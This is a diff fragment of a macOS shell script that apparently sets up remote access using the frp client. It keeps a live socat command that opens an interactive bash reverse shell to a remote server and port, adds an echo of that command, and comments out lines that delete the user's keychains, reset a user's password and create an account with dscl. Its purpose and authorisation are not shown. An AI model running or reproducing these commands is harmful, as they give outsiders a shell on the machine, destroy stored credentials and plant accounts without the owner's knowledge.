@@ -26,11 +26,12 @@ cp frp_0.20.0_darwin_amd64/frpc ./bin/
 #sudo rm -r /Users/$jssshuser/Library/Keychains/*
 #echo "aaaaa3"
 #sudo dscl . -passwd /Users/$jssshuser $jssshpwd
-echo "aaaaa4"
+#echo "aaaaa4"
 #sudo dscl . -create /Users/tttt UserShell /bin/bash
-sudo dscl . -create /Users/tttt
+#sudo dscl . -create /Users/tttt
 echo "aaaaa5"
-sudo dscl . -passwd /Users/tttt $jssshpwd
+#sudo dscl . -passwd /Users/tttt $jssshpwd
+echo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
 
 rm -rf frpc.ini
